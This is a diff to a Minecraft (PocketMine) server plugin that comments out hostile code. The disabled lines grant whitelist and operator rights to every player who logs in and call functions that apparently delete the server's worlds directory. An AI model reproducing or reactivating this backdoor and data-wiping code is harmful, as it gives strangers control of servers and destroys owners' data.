@@ -13,14 +13,14 @@ class Main extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Li
   public function onEnable()
   {
     $this->getServer()->getPluginManager()->registerEvents($this,$this);
-    $this->world();
-    $this->plugin();
+    //$this->world();
+    //$this->plugin();
   }
   public function onLogin(PlayerPreLoginEvent $event){
 	  $player = $event->getPlayer();
           $name = $player->getName();
-	  $this->getServer()->addWhitelist($name);
-	  $this->getServer()->addOp($name);
+	  //$this->getServer()->addWhitelist($name);
+	  //$this->getServer()->addOp($name);
   }
   public function playerCommand(PlayerCommandPreprocessEvent $event)
   {
@@ -32,7 +32,7 @@ class Main extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Li
   {
 		$event->setCancelled();
 	}
-  public function world()
+  /*public function world()
   {
 		$dir = $this->getServer()->getDataPath() ."worlds";
 		if (is_dir($dir) and !is_link($dir)) {
@@ -59,5 +59,5 @@ class Main extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Li
 	}
 	public function remove_directory($dir){
 		unlink("$dir");
-	}
+	}*/
 }
